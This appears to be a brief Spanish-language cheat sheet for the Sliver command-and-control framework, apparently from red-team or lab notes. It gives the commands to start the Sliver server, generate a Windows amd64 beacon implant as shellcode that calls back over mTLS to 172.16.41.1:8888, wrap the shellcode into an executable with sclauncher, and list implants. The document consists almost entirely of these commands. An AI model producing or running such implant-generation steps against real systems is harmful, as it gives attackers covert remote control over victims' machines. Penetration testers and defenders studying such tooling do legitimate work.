# Iniciar Sliver

```bash
systemctl start sliver
```

```bash
sliver
```

# Crear un implante

```bash
generate beacon --mtls 172.16.41.1:8888 --os windows --arch amd64 --format shellcode --save ~projects/sliver
```

```
# pasa el .bin a un exe para pruebas
sclauncher.exe -f=PROUD_SHED.bin -pe -64 -o=main.exe
```

# Ver los implantes creados

```bash
implants
```